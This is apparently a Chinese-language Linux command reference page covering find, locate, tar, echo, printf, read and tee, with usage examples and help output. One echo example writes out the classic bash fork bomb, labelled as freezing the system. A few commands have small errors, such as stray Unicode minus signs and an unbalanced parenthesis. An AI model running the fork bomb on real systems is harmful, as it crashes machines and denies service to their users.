find /home -iname "*.txt"                    # 在/home目录下查找以.txt结尾的文件名,但忽略大小写
find /home ! -name "*.txt"                   # 找出/home下不是以.txt结尾的文件
find . \( -name "*.txt" -o -name "*.pdf" \)  # 当前目录及子目录下查找所有以.txt和.pdf结尾的文件
find . -name "*.txt" -o -name "*.pdf"        # 当前目录及子目录下查找所有以.txt和.pdf结尾的文件
find /usr/ -path "*local*"                   # 匹配文件路径或者文件
find . -regex ".*\(\.txt\|\.pdf\)$"          # 基于正则表达式匹配文件路径
find . -iregex ".*\(\.txt\|\.pdf\)$"         # 基于正则表达式匹配文件路径,但忽略大小写
find . -empty                                # 要列出所有长度为零的文件

跳过子目录
设当前目录下有a,b,c三个目录里面都有一个s.txt文件
要忽略a目录,-o是-or的意思:
$find . -path ./a -prune -o -type f -name s.txt -print
要忽略a,b两个目录,(和)前要加\,而且两个转义字符前后都要有空格,路径名和文件名有空格时必须用双引号括起来:
$find . \( −path ./a −o −path ./b \) -prune -o -type f -name s.txt -print

基于目录深度搜索
find . -maxdepth 3 -type f                   # 向下最大深度限制为3
find . -mindepth 2 -type f                   # 搜索出深度距离当前目录至少2个子目录的所有文件

根据文件时间戳进行搜
UNIX/Linux文件系统每个文件都有三种时间戳:
访问时间(-atime/天,-amin/分钟):用户最近一次访问时间。
修改时间(-mtime/天,-mmin/分钟):文件最后一次修改时间。
变化时间(-ctime/天,-cmin/分钟):文件数据元(例如权限等)最后一次修改时间

find . -type f -atime -7        # 搜索最近七天内被访问过的所有文件
find . -type f -atime 7         # 搜索恰好在七天前被访问过的所有文件
find . -type f -atime +7        # 搜索超过七天内被访问过的所有文件
find . -type f -amin +10        # 搜索访问时间超过10分钟的所有文件
find . -type f -newer file.log  # 找出比file.log修改时间更长的所有文件

根据文件大小进行匹配
find . -type f -size 文件大小单元
文件大小单元: b —> 块(512字节) c —> 字节 w —> 字(2字节) k —> 千字节 M —> 兆字节 G —> 吉字节 

find . -type f -size +10k        # 搜索大于10KB的文件
find . -type f -size -10k        # 搜索小于10KB的文件
find . -type f -size 10k         # 搜索等于10KB的文件

删除匹配文件
find . -type f -name "*.txt" -delete  # 删除当前目录下所有.txt文件

根据文件权限/所有权进行匹配
find . -type f -perm 777                    # 当前目录下搜索出权限为777的文件
find . -type f -name "*.php" ! -perm 644    # 找出当前目录下权限不是644的php文件
find . -type f -user tom                    # 找出当前目录用户tom拥有的所有文件
find . -type f -group sunk                  # 找出当前目录用户组sunk拥有的所有文件

>> 借助-exec选项与其他命令结合使用
找出当前目录下所有root的文件并把所有权更改为用户tom
{}用于与-exec选项结合使用来匹配所有文件,然后会被替换为相应的文件名
find . -type f -user root -exec chown tom {} \;
find . -type f -exec grep hello '{}' ';'
find . -type f -exec grep hello '{}' ';' -print         # 打印出相应的文件名

找出自己家目录下所有的.txt文件并删除,-ok和-exec行为一样,不过它会给出提示,是否执行相应的操作
find $HOME/. -name "*.txt" -ok rm {} \;

查找当前目录下所有.txt文件并把他们拼接起来写入到all.txt文件中
find . -type f -name "*.txt" -exec cat {} \;> all.txt

将30天前的.log文件移动到old目录中
find . -type f -mtime +30 -name "*.log" -exec cp {} old \;

找出当前目录下所有.txt文件并以"File:文件名"的形式打印出来
find . -type f -name "*.txt" -exec printf "File: %s\n" {} \;

因为单行命令中-exec参数中无法使用多个命令,以下方法可以实现在-exec之后接受多条命令
-exec ./text.sh {} \;

【 locate命令 】
用于查找符合条件的文档,locate命令其实是"find -name"的另一种写法,但要比后者快得多,原因在于它会去系统自动创建的保存本地所有文档和目录名称的数据库/var/lib/locatedb内查找合乎范本样式条件的文档或目录,locate无法找到今天最近创建的文件,手动执行sudo updatedb后才可以,所以locate的查找并不是实时的,而是以数据库更新为准,一般是系统自己维护,也可以locate -u命令手工升级数据库
find是去硬盘找,locate的速度比find快,它并不是真的查找,而是查数据库

-d或--database= 配置locate指令使用的数据库,预设的数据库位于/var/lib/slocate/slocate.db
--help 　   在线帮助
--version 　显示版本信息

$ locate /etc/sh  搜索etc目录下所有以sh开头的文件。
$ locate ~/m      搜索用户主目录下,所有以m开头的文件。
$ locate -i ~/m   搜索用户主目录下,所有以m开头的文件,并且忽略大小写。

【 whereis命令 】
whereis使用系统自动构建的数据库来搜索可执行文件,源文件和手册页面,查找命令的目录
whereis命令只能用于程序名的搜索,而且只搜索二进制文件(参数-b)、man说明文件(参数-m)和源代码文件(参数-s)。如果省略参数,则返回所有信息。

$ whereis grep
$ whereis ssh
$ whereis -b bash       # 仅查找binary
bash: /usr/bin/bash /etc/bash.bashrc /etc/bash.bash_logout
$ whereis -m bash       # 仅查找manual
bash: /usr/share/man/man1/bash.1.gz /usr/share/info/bash.info.gz

【 which命令 】
在环境变量PATH指定的目录中搜索可执行文件,搜索某个系统命令的位置,并且返回第一个搜索结果,即使用which命令就可以看到某个系统命令是否存在,以及执行的到底是哪一个位置的命令,此命令将打印可执行文件的完整路径。
which program_name
which php

【 type命令 】
type命令其实不能算查找命令,它是用来区分某个命令到底是由shell自带的,还是由shell外部的独立二进制文件提供的。如果一个命令是外部命令,那么使用-p参数,会显示该命令的路径,相当于which命令。

$ type cd   系统会提示,cd是shell的自带命令(build-in)。
$ type grep 系统会提示,grep是一个外部命令,并显示该命令的路径。
$ type -p grep  加上-p参数后,就相当于which命令。

</pre>

<h4>打包压缩命令</h4><pre>
gzip:压缩文件
gzip filename

gunzip:解压缩gzip压缩的文件。
gunzip filename

【 tar命令 】
tar [选项] [文件]
tar命令主要用于创建归档文件和解压归档文件,其本身是没有压缩功能的,但可调用gzip、bzip2进行压缩处理
-c 创建压缩归档,产生新的包
-x 解压归档
-t 查看内容,列出归档中的文件
-r 向压缩归档文件末尾追加文件
-u 更新原压缩包中的文件

-v 显示处理过程
-j 调用bzip2进行解压缩
-z 调用gzip进行解压缩
-Z 有compress属性的
-O 将文件解开到标准输出

-f 指定包的文件名,其后必须紧跟目标文件,最后一个参数

打包
$ tar -cf all.tar *.jpg  # 将所有.jpg的文件打成一个名为all.tar的包
$ tar -rf all.tar *.gif  # 将所有.gif的文件增加到all.tar的包里面去
$ tar -uf all.tar logo.gif # 更新原来tar包all.tar中logo.gif文件
$ tar -tf all.tar        # 列出all.tar包中所有文件
$ tar -xf all.tar        # 解出all.tar包中所有文件

$ tar -cvf /opt/123.tar /home/*           # 多文件打包
$ tar -cvf /opt/123.tar /home/*.out       # 多文件打包
$ tar -cvf /opt/123.tar 1.out 2.out 3.out # 多文件打包
$ tar -cvf /home/w/img.tar /home/www/img  # 将整个/home/w/img目录下的文件全打包为/home/w/img.tar

压缩
$ tar -czf jpg.tar.gz *.jpg   # 将目录里所有jpg文件打包成jpg.tar后用gzip压缩,生成名为jpg.tar.gz的gzip压缩过的包
$ tar czvf ke.tgz li          # 将li目录压缩到ke.tgz
$ tar -cjf jpg.tar.bz2 *.jpg  # 将目录里所有jpg文件打包成jpg.tar后用bzip2压缩,生成名为jpg.tar.gz的bzip2压缩过的包
$ tar -cZf jpg.tar.Z *.jpg  #  将目录里所有jpg文件打包成jpg.tar后用compress压缩,生成一个jpg.tar.Z的compress压缩包
$ rar a jpg.rar *.jpg       # rar格式的压缩,需要先下载rar for linux
$ zip jpg.zip *.jpg         # zip格式的压缩,需要先下载zip for linux

解压
$ tar -xvf file.tar        # 解压tar包
$ tar -xzvf file.tar.gz    # 解压tar.gz
$ tar -xjvf file.tar.bz2   # 解压tar.bz2
$ tar -xZvf file.tar.Z     # 解压tar.Z
$ unrar e file.rar         # 解压rar
$ unzip file.zip           # 解压zip

解压到指定文件夹之前必须保证文件夹存在,这个和cp命令有点不同,如果不存在这个目录cp命令就会自动创建这个目录
$ tar -xzvf jdk-8u131-linux-x64.tar.gz -C /usr/local/java # 解压jdk到指定文件夹,前提要保证存在这个目录
$ tar xzvf /source/kernel.tgz -C /source/linux-2.6.29     # 将/source/kernel.tgz解压到/source/linux-2.6.29目录

$ tar -cvf filename.tar .       # 将当前目录所有文件归档但不压缩,后面有个.代表当前目录
$ tar -xvf filename.tar         # 解压 filename.tar 到当前文件夹
$ tar -cvjf filename.tar.bz2 .  # 使用 bzip2 压缩
$ tar -xvjf  filename.tar.bz2   # 解压 filename.tar.bz2 到当前文件夹
$ tar -cvzf filename.tar.gz     # 使用 gzip  压缩
$ tar -xvzf filename.tar.gz     # 解压 filename.tar.gz 到当前文件夹
$ tar -tf   filename            # 只查看 filename 归档中的文件,不解压

$ zip filename.zip files   将files压缩到filename.zip .

*.tar           用tar –xvf解压
*.gz            用gzip -d或gunzip解压
*.tar.gz和*.tgz 用tar –xzf解压
*.bz2           用bzip2 -d或用bunzip2解压
*.tar.bz2       用tar –xjf解压
*.Z             用uncompress解压
*.tar.Z         用tar –xZf解压
*.rar           用unrar解压
*.zip           用unzip解压

liunx服务器上默认没有安装zip、unzip命令,所以使用时需安装:
apt install zip
apt install unzip

$ unzip -l chm.zip         # list files(short format)
$ unzip -l chm             # list files(short format)
$ unzip chm.zip            # 解压zip压缩包
$ zip -r chm.zip ../chm/   # 把chm目录下所有文件打包到chm.zip

tar -czvf ben.tar.gz /home/ben/   # 对ben用户的文件进行备份

</pre><textarea>~# tar --help
用法: tar [选项...] [FILE]...
GNU 'tar' saves many files together into a single tape or disk archive, and can
restore individual files from the archive.

Examples:
tar -cf archive.tar foo bar # Create archive.tar from files foo and bar.
tar -tvf archive.tar # List all files in archive.tar verbosely.
tar -xf archive.tar # Extract all files from archive.tar.

主操作模式:
-A, --catenate, --concatenate 追加tar文件至归档
-c, --create 创建一个新归档
-d, --diff, --compare 找出归档和文件系统的差异
--delete 从归档中删除
-r, --append 追加文件至归档结尾
-t, --list 列出归档内容
--test-label 测试归档卷标并退出
-u, --update 仅追加比归档中副本更新的文件
-x, --extract, --get 从归档中解出文件

操作修饰符:
--check-device 当创建增量归档时检查设备号(默认)
-g, --listed-incremental=FILE 处理新式的 GNU 格式的增量备份
-G, --incremental 处理老式的 GNU 格式的增量备份
--ignore-failed-read 当遇上不可读文件时不要以非零值退出
--level=NUMBER 所创建的增量列表归档的输出级别
-n, --seek 归档可检索
--no-check-device 当创建增量归档时不要检查设备号
--no-seek 归档不可检索
--occurrence[=NUMBER] 仅处理归档中每个文件的第 NUMBER 个事件;仅当与以下子命令 --delete,--diff, --extract 或--list
中的一个联合使用时,此选项才有效。而且不管文件列表是以命令行形式给出或是通过
-T 选项指定的;NUMBER 值默认为 1
--sparse-version=MAJOR[.MINOR] 设置所用的离散格式版本(隐含--sparse)
-S, --sparse 高效处理离散文件

重写控制:
-k, --keep-old-files don't replace existing files when extracting,
treat them as errors
--keep-directory-symlink preserve existing symlinks to directories when
extracting
--keep-newer-files 不要替换比归档中副本更新的已存在的文件
--no-overwrite-dir 保留已存在目录的元数据
--one-top-level[=DIR] create a subdirectory to avoid having loose files extracted
--overwrite 解压时重写存在的文件
--overwrite-dir 解压时重写已存在目录的元数据(默认)

--recursive-unlink 解压目录之前先清除目录层次
--remove-files 在添加文件至归档后删除它们
--skip-old-files don't replace existing files when extracting, silently skip over them
-U, --unlink-first 在解压要重写的文件之前先删除它们
-W, --verify 在写入以后尝试校验归档

选择输出流:
--ignore-command-error 忽略子进程的退出代码
--no-ignore-command-error 将子进程的非零退出代码认为发生错误
-O, --to-stdout 解压文件至标准输出
--to-command=COMMAND 将解压的文件通过管道传送至另一个程序

操作文件属性:
--atime-preserve[=METHOD] 在输出的文件上保留访问时间,要么通过在读取(默认METHOD='replace')后还原时间,要不就不要在第一次(METHOD='system')设置时间
--clamp-mtime only set time when the file is more recent than what was given with --mtime
--delay-directory-restore 直到解压结束才设置修改时间和所解目录的权限
--group=名称 强制将 NAME 作为所添加的文件的组所有者
--mode=CHANGES 强制将所添加的文件(符号)更改为权限 CHANGES
--mtime=DATE-OR-FILE 从 DATE-OR-FILE 中为添加的文件设置 mtime
-m, --touch 不要解压文件的修改时间
--no-delay-directory-restore 取消 --delay-directory-restore 选项的效果
--no-same-owner 将文件解压为您所有(普通用户默认此项)
--no-same-permissions 从归档中解压权限时使用用户的掩码位(默认为普通用户服务)
--numeric-owner 总是以数字代表用户/组的名称
--owner=名称 强制将 NAME 作为所添加的文件的所有者
-p, --preserve-permissions, --same-permissions 解压文件权限信息(默认只为超级用户服务)
--preserve 与 -p 和 -s 一样
--same-owner 尝试解压时保持所有者关系一致(超级用户默认此项)
-s, --preserve-order, --same-order member arguments are listed in the same order as the files in the archive
--sort=ORDER directory sorting order: none(default), name or inode

Handling of extended file attributes:
--acls Enable the POSIX ACLs support
--no-acls Disable the POSIX ACLs support
--no-selinux Disable the SELinux context support
--no-xattrs Disable extended attributes support
--selinux Enable the SELinux context support
--xattrs Enable extended attributes support
--xattrs-exclude=MASK specify the exclude pattern for xattr keys
--xattrs-include=MASK specify the include pattern for xattr keys

设备选择和切换:
-f, --file=ARCHIVE 使用归档文件或 ARCHIVE 设备
--force-local 即使归档文件存在副本还是把它认为是本地归档
-F, --info-script=名称, --new-volume-script=名称 在每卷磁带最后运行脚本(隐含 -M)
-L, --tape-length=NUMBER 写入 NUMBER × 1024 字节后更换磁带
-M, --multi-volume 创建/列出/解压多卷归档文件
--rmt-command=COMMAND 使用指定的 rmt COMMAND 代替 rmt
--rsh-command=COMMAND 使用远程 COMMAND 代替 rsh
--volno-file=FILE 使用/更新 FILE 中的卷数

设备分块:
-b, --blocking-factor=BLOCKS 每个记录 BLOCKS x 512 字节
-B, --read-full-records 读取时重新分块(只对 4.2BSD 管道有效)
-i, --ignore-zeros 忽略归档中的零字节块(即文件结尾)
--record-size=NUMBER 每个记录的字节数 NUMBER,乘以 512

选择归档格式:
-H, --format=FORMAT 创建指定格式的归档

FORMAT是以下格式中的一种:
gnu GNU tar 1.13.x格式
oldgnu GNU格式 as per tar <= 1.12
pax POSIX 1003.1-2001(pax)格式
posix等同于pax
ustar POSIX 1003.1-1988(ustar)格式
v7 old V7 tar格式

--old-archive, --portability 等同于 --format=v7
--pax-option=关键字[[:]=值][,关键字[[:]=值]]... 控制pax关键字
--posix 等同于 --format=posix
-V, --label=TEXT 创建带有卷名TEXT的归档;在列出/解压时使用TEXT作为卷名的模式串

压缩选项:
-a, --auto-compress 使用归档后缀名来决定压缩程序
-I, --use-compress-program=PROG 通过PROG过滤(必须是能接受-d选项的程序)
-j, --bzip2 通过bzip2过滤归档
-J, --xz 通过xz过滤归档
--lzip 通过lzip过滤归档
--lzma 通过xz过滤归档
--lzop 通过xz过滤归档
--no-auto-compress 不使用归档后缀名来决定压缩程序
-z, --gzip, --gunzip, --ungzip 通过gzip过滤归档
-Z, --compress, --uncompress 通过compress过滤归档

本地文件选择:
--add-file=FILE 添加指定的 FILE 至归档(如果名字以 - 开始会很有用的)
--backup[=CONTROL] 在删除前备份,选择CONTROL版本
-C, --directory=DIR 改变至目录DIR
--exclude=PATTERN 排除以 PATTERN 指定的文件
--exclude-backups 排除备份和锁文件
--exclude-caches 除标识文件本身外,排除包含
CACHEDIR.TAG 的目录中的内容
--exclude-caches-all 排除包含CACHEDIR.TAG的目录
--exclude-caches-under 排除包含CACHEDIR.TAG的目录中所有内容
--exclude-ignore=FILE read exclude patterns for each directory from FILE, if it exists
--exclude-ignore-recursive=FILE read exclude patterns for each directory and its subdirectories from FILE, if it exists
--exclude-tag=FILE 除FILE自身外,排除包含FILE的目录中的内容
--exclude-tag-all=FILE 排除包含FILE的目录
--exclude-tag-under=FILE 排除包含FILE的目录中的所有内容
--exclude-vcs 排除版本控制系统目录
--exclude-vcs-ignores read exclude patterns from the VCS ignore files
-h, --dereference 跟踪符号链接;将它们所指向的文件归档并输出
--hard-dereference 跟踪硬链接;将它们所指向的文件归档并输出
-K, --starting-file=MEMBER-NAME begin at member MEMBER-NAME when reading the archive
--newer-mtime=DATE 当只有数据改变时比较数据和时间
--no-null 禁用上一次的效果 --null选项
--no-recursion 避免目录中的自动降级
--no-unquote do not unquote input file or member names
--null -T 读取以空终止的名字,-C禁用
-N, --newer=DATE-OR-FILE, --after-date=DATE-OR-FILE 只保存比 DATE-OR-FILE 更新的文件
--one-file-system 创建归档时保存在本地文件系统中
-P, --absolute-names don't strip leading '/'s from file names
--recursion 目录递归(默认)
--suffix=STRING 在删除前备份,除非被环境变量SIMPLE_BACKUP_SUFFIX覆盖,否则覆盖常用后缀('')
-T, --files-from=FILE 从FILE中获取文件名来解压或创建文件
--unquote unquote input file or member names(default)
-X, --exclude-from=FILE 排除FILE中列出的模式串

文件名变换:
--strip-components=NUMBER 解压时从文件名中清除NUMBER个引导部分
--transform=EXPRESSION, --xform=EXPRESSION 使用sed代替EXPRESSION来进行文件名变换

文件名匹配选项(同时影响排除和包括模式串):
--anchored 模式串匹配文件名头部
--ignore-case 忽略大小写
--no-anchored patterns match after any '/'(default for exclusion)
--no-ignore-case 匹配大小写(默认)
--no-wildcards 逐字匹配字符串
--no-wildcards-match-slash wildcards do not match '/'
--wildcards 使用通配符(默认对 exclusion )
--wildcards-match-slash wildcards match '/'(default for exclusion)

提示性输出:
--checkpoint[=NUMBER] 每隔 NUMBER 个记录显示进度信息(默认为 10 个)
--checkpoint-action=ACTION 在每个检查点上执行 ACTION
--full-time 按文件原本时间格式打印
--index-file=FILE 将详细输出发送至 FILE
-l, --check-links 只要不是所有链接都被输出就打印信息
--no-quote-chars=STRING 禁用来自 STRING 的字符引用
--quote-chars=STRING 来自 STRING 的额外的引用字符
--quoting-style=STYLE 设置名称引用风格;有效的 STYLE 值请参阅以下说明
-R, --block-number 每个信息都显示归档内的块数
--show-defaults 显示 tar 默认选项
--show-omitted-dirs 列表或解压时,列出每个不匹配查找标准的目录
--show-snapshot-field-ranges show valid ranges for snapshot-file fields
--show-transformed-names, --show-stored-names 显示变换后的文件名或归文件名
--totals[=SIGNAL] 处理归档后打印出总字节数;当此
SIGNAL 被触发时带参数 - 打印总字节数;允许的信号为: SIGHUP,SIGQUIT,SIGINT,SIGUSR1 和 SIGUSR2;同时也接受不带 SIG 前缀的信号名称
--utc 以 UTC 格式打印文件修改时间
-v, --verbose 详细地列出处理的文件
--warning=KEYWORD 警告控制:
-w, --interactive, --confirmation 每次操作都要求确认

兼容性选项:
-o 创建归档时,相当于 --old-archive;展开归档时,相当于 --no-same-owner

其它选项:
-?, --help 显示此帮助列表
--restrict 禁用某些潜在的有危险的选项
--usage 显示简短的用法说明
--version 打印程序版本

长选项和相应短选项具有相同的强制参数或可选参数。
The backup suffix is '~', unless set with --suffix or SIMPLE_BACKUP_SUFFIX.
The version control may be set with --backup or VERSION_CONTROL, values are:

none, off never make backups
t, numbered make numbered backups
nil, existing numbered if numbered backups exist, simple otherwise
never, simple always make simple backups

--quoting-style选项的有效参数为:
literal
shell
shell-always
c
c-maybe
escape
locale
clocale

此tar默认为:
--format=gnu -f- -b20 --quoting-style=escape --rmt-command=/usr/lib/tar/rmt
--rsh-command=/usr/bin/rsh

</textarea>
</div>

<div id="syscmd">
<h3>系统工作命令</h3><pre>
basename /a/b/c # c,从全路径中保留最后一层文件名或目录
dirname /a/b/c  # /a/b,取路径

</pre><textarea>echo $0
echo $pwd
CURRENT_DIR=$(dirname $0)
BASENAME=$(basename $PWD)
HOSTNAME=$(hostname)
echo $CURRENT_DIR
echo $BASENAME
echo $HOSTNAME
cd $CURRENT_DIR

berlin75@LAPTOP-0KMQM01D:/mnt/e/wamp64/www/study/shell$ bash study.sh
study.sh
/mnt/e/wamp64/www/study/shell
.
shell
LAPTOP-0KMQM01D

berlin75@LAPTOP-0KMQM01D:/mnt/e/wamp64/www/study$ bash shell/study.sh
shell/study.sh
/mnt/e/wamp64/www/study
shell
study
LAPTOP-0KMQM01D

</textarea>

<h4>yes命令</h4><pre>
yes命令在命令行中输出指定的字符串,直到yes进程被ctrl+c或killall yes杀死,不带任何参数输入yes命令默认的字符串就是y
yes             # 重复打印y
yes testline    # 重复打印testline
yes | rm -i *   # 自动回答y或其他

#!/bin/sh
yes hello >hello.txt &
PID=$!
sleep 1
kill $PID
ls -l hello.txt

</pre>

<h4>echo命令</h4><pre>
用于在终端输出字符串或变量的值,echo会将输入的字符串送往标准输出,输出的字符串间以空白字符隔开,并在最后加上换行号

echo [-ne][string | $变量]
echo [--help][--version]

参数
-n 不要在最后自动换行
-e 若字符串中出现以下字符则特别加以处理,而不会将它当成一般
  文字输出:
   \a 发出警告声,例:echo -e '\a',同dos的echo ^G,请先检查音量设置
   \b 删除前一个字符;
   \c 最后不加上换行符号,例echo -e "OK! \c"中-e开启转义\c不换行
   \f 换行但光标仍旧停留在原来的位置;
   \n 换行且光标移至行首,例echo -e "OK! \n"中-e开启转义|n换行
   \r 光标移至行首,但不换行;
   \t 插入tab;
   \v 与\f相同;
   \\ 插入\字符;
   \nnn 插入nnn(八进制)所代表的ASCII字符;

echo加引号和不加引号的区别
$ echo "hello   world"   # 加引号原样输出字符串
hello   world
$ echo 'hello   world'   # 加引号原样输出字符串
hello   world
$ echo hello   world     # 不加引号时将字符串中的各个单词作为字符串输出,各字符串之间用一个空格分割
hello world

</pre><textarea>$ echo -n "Tecmint is a community of Linux Nerds"      # '-n'会在echo完后不会输出新行
Tecmint is a community of Linux Nerdsberlin75@LAPTOP-0KMQM01D:~$

$ echo -e "Tecmint is a community of \aLinux Nerds"    # '-e'后面跟上'\a'选项会听到声音警告
Tecmint is a community of Linux Nerds

$ echo -e "Tecmint \bis \ba \bcommunity \bof \bLinux \bNerds"  # '-e'后带上'\b'会删除字符间的所有空格
TecmintisacommunityofLinuxNerds

$ echo -e "Tecmint \nis \na \ncommunity \nof \nLinux \nNerds"  # '-e'后面的带上'\n'行会在遇到的地方作为新的一行
Tecmint
is
a
community
of
Linux
Nerds

$ echo -e "Tecmint \tis \ta \tcommunity \tof \tLinux \tNerds"  # '-e'后面跟上'\t'会在空格间加上水平制表符
Tecmint         is      a       community       of      Linux   Nerds

$ echo -e "\n\tTecmint \n\tis \n\ta \n\tcommunity \n\tof \n\tLinux \n\tNerds"

$ echo -e "\vTecmint \vis \va \vcommunity \vof \vLinux \vNerds"  # '-e'后面跟上'\v'会加上垂直制表符
Tecmint is a community of Linux Nerds

$  echo -e "\n\vTecmint \n\vis \n\va \n\vcommunity \n\vof \n\vLinux \n\vNerds"
Tecmint
is
a
community
of
Linux
Nerds

$ echo -e "Tecmint \ris a community of Linux Nerds"    # '-e'后面跟上'\r'来指定输出中的回车符
is a community of Linux Nerds

$ echo -e "Tecmint is a community \cof Linux Nerds"    # '-e'后面跟上'\c'会抑制输出后面的字符并且最后不会换新行
Tecmint is a community berlin75@LAPTOP-0KMQM01D:~$

</textarea><textarea>$ echo                         # 不带任何参数则输出空行,可用作换行
$ echo -ne "Hello\nWorld\n"    # 用字母之间的换行显示 "Hello World"
$ echo "\"It is a test\""      # 显示转义字符,显示"It is a test"
$ echo \"It is a test\"        # 同上
$ echo '$name\"'               # 原样输出字符串,不进行转义或取变量(用单引号),输出$name\"
$ echo $SHELL                  # 使用$变量的方式获取系统变量SHELL的值
$ echo `date`                  # 使用的是反引号 `, 而不是单引号 ',显示命令执行结果,显示当前日期

$ echo "It is a test" > myfile       # 显示结果定向至文件
$ echo /pic/{001..020}.jpg >url.txt  # 批量添加到文件

$ echo *                   # 使用echo命令打印所有的文件和文件夹(ls命令的替代)
$ echo *.jpeg              # 打印所有的'.jpeg'文件
echo {a,b}{c,d}{e,f}       # 排列组合(括号内一个元素分别和其他括号内元素组合),输出ace acf ade adf bce bcf bde bdf
echo $((2#11010)           # 二进制转10进制
echo {1..10}               # 打印10个字符
printf '%10s\n'|tr " " a   # 打印10个字符

:(){ :|:& };:                     # 著名的fork炸弹,系统执行海量的进程,直到系统僵死
echo -e "\e[32m....\e[0m"         # 打印颜色
echo -e "\033[0;31mL\033[0;32mO\033[0;33mV\033[0;34mE\t\033[0;35mY\033[0;36mO\033[0;32mU\e[m" # 打印颜色

</textarea><textarea>echo: echo [-neE] [arg ...]
Write arguments to the standard output.
Display the args, separated by a single space character and followed by a newline on the standard output.
Options:
  -n        do not append a newline
  -e        enable interpretation of the following backslash escapes
  -E        explicitly suppress interpretation of backslash escapes
`echo' interprets(解释) the following backslash-escaped characters:
  \a        alert(bell)
  \b        backspace
  \c        suppress further output
  \e        escape character
  \E        escape character
  \f        form feed
  \n        new line
  \r        carriage return
  \t        horizontal tab
  \v        vertical tab
  \\        backslash
  \0nnn     the character whose ASCII code is NNN(octal).  NNN can be 0 to 3 octal digits
  \xHH      the eight-bit character whose value is HH(hexadecimal).  HH can be one or two hex digits

</textarea>

<h4>printf命令</h4><pre>
printf命令模仿C程序库(library)里的printf()程序,printf由POSIX标准所定义,因此使用printf的脚本比使用echo移植性好。
printf使用引用文本或空格分隔的参数,外面可以在printf中使用格式化字符串,还可以制定字符串的宽度、左右对齐方式等,默认printf不会像echo自动添加换行符,可以手动添加\n

语法:
printf format-string [arguments...]
参数:
format-string: 为格式控制字符串
arguments: 为参数列表。

%s %c %d %f都是格式替代符
%-10s指一个宽度为10个字符,-表示左对齐,没有则表示右对齐,任何字符都会被显示在10个字符宽的字符内,如果不足则自动以空格填充,超过也会将内容全部显示出来。
%-4.2f指格式化为小数,其中.2指四舍五入保留2位小数

d: Decimal 十进制整数 -- 对应位置参数必须是十进制整数,否则报错
s: String 字符串 -- 对应位置参数必须是字符串或者字符型,否则报错
c: Char 字符 -- 对应位置参数必须是字符串或者字符型,否则报错
f: Float 浮点 -- 对应位置参数必须是数字型,否则报错
如:其中最后一个参数是 "def",%c 自动截取字符串的第一个字符作为结果输出。
$  printf "%d %s %c\n" 1 "abc" "def"
1 abc d

</pre><textarea>printf "%d %s\n" 1 "abc"   # format-string为双引号
printf '%d %s\n' 1 "abc"   # 单引号与双引号效果一样
printf %s abcdef           # 没有引号也可以输出
printf "%s and %d \n"      # 如果没有arguments,那么%s用NULL代替,%d用0代替
printf %s abc def          # 多出的参数仍然会按照该格式输出,format-string被重用
printf "%s\n" abc def
printf "%s %s %s\n" a b c d e f g h i j

printf "%-10s %-8s %-4s\n" 姓名 性别 体重kg
printf "%-10s %-8s %-4.2f\n" 郭靖 男 66.1234
printf "%-10s %-8s %-4.2f\n" 杨过 男 48.6543
printf "%-10s %-8s %-4.2f\n" 郭芙 女 47.9876

</textarea><pre>
printf的转义序列
\a  警告字符,通常为ASCII的BEL字符
\b  后退
\c  抑制(不显示)输出结果中任何结尾的换行字符(只在%b格式指示符控制下的参数字符串中有效),而且,任何留在参数里的字符、任何接下来的参数以及任何留在格式字符串中的字符,都被忽略
\f  换页(formfeed)
\n  换行
\r  回车(Carriage return)
\t  水平制表符
\v  垂直制表符
\\  一个字面上的反斜杠字符
\ddd  表示1到3位数八进制值的字符。仅在格式字符串中有效
\0ddd 表示1到3位的八进制值字符

$ printf "a string, no processing:< %s >\n" "A\nB"
a string, no processing:< A\nB >

$ printf "a string, no processing:< %b >\n" "A\nB"
a string, no processing:< A
B >

$ printf "www.runoob.com \a"
www.runoob.com $                  #不换行

</pre>

<h4>read命令</h4><pre>
read命令从键盘一次读取多个变量的值,变量和输入的值都需要使用空格隔开,输入的值没隔开时后面的变量值为空,read命令后面如果没有指定变量名,读取的数据将被自动赋值给特定的变量REPLY,通常用在shell脚本中与用户进行交互的场合。

read命令从标准输入中读取一行,并把输入行的每个字段的值指定给shell变量
read命令一个一个词组地接收输入的参数,每个词组需要使用空格进行分隔
如果输入的词组个数大于需要的参数个数,多出的词组将被作为整体为最后一个参数接收

参数:
-a 把单词清单读入arrayname的数组里,如read -a arrayname
-p 输入提示文字
-n 输入字符长度限制(达到限制自动结束)
-t 输入限时,如read -t 3表示指定读取等待时间为3秒
-s 隐藏输入内容
-r 允许输入包含反斜杠,如read -r line
-n 例:read -n 2 var表示从输入中读取两个字符并存入变量var,不需要按回车读取
-d 例:read -d ":" var表示用定界符":"结束输入行;例:read -d "quit"

</pre><textarea>read r0
echo 第一个输入:$r0
#echo $(($r)
read r1 r2     # 从标准输入读取输入到第一个空格或回车,将输入的第一个单词放到变量r1中,并将该行其他的输入放在变量r2中
echo 输入1:$r1, 输入2:$r2
read -p 'REPLY:'
echo $REPLY

</textarea><textarea>$ read -a friends
Tim Tom Helen
$ echo "They are ${friends[0]}, ${friends[1]} and ${friends[2]}."
They are Tim, Tom and Helen.

</textarea><textarea>#!/bin/sh
#study
read -p "请输入用户名:" name                    # name 接收标准输入的变量
echo "$name ,welocome!"
read -p "请输入六位密码:" -n 6 -t 30 -s password
echo -e "\npassword is $password"

</textarea>read命令设置默认值<textarea>echo -n "want to sync?(y/n):"
read AAA
if [ "${AAA:-y}" = "y" ];then
  sync_server
else
  echo nothing done,bye
fi

</textarea>一个终端输入密码时候,不让密码显示出来<textarea>方法1:
#!/bin/bash
read -p "输入密码:" -s pwd
echo
echo 输入的密码是: "$pwd"

方法2:选项-echo禁止将输出发送到终端,而选项echo则允许发送输出
#!/bin/bash
stty -echo
read -p "输入密码:" pwd
stty echo
echo
echo 输入完毕。
echo 输入的密码是: $pwd

</textarea><textarea>#!/bin/bash
read -p "please input(y/n) : " yn
if [ "${yn}" == "Y" ] || [ "${yn}" == "y" ]; then
  echo "yes"
  exit 0
fi
if [ "${yn}" == "N" -o "${yn}" == "n" ]; then
  echo "no"
  exit 0
fi
echo "finish" && exit 0

</textarea>

<h4>tee命令</h4><pre>
tee指令会从标准输入设备读取数据,将其内容输出到标准输出设备,同时保存成文件,可用来创建文件

tee [-ai][--help][--version][文件...]

参数:
-a或--append 　           附加到既有文件的后面,而非覆盖它,默认覆盖
-i或--ignore-interrupts 　忽略中断信号。
--help 　                 在线帮助。
--version 　              显示版本信息。

使用指令"tee"将用户输入的数据同时保存到文件"file1"和"file2"中,ctrl+c结束输出
$ tee file1 file2         #在两个文件中复制内容

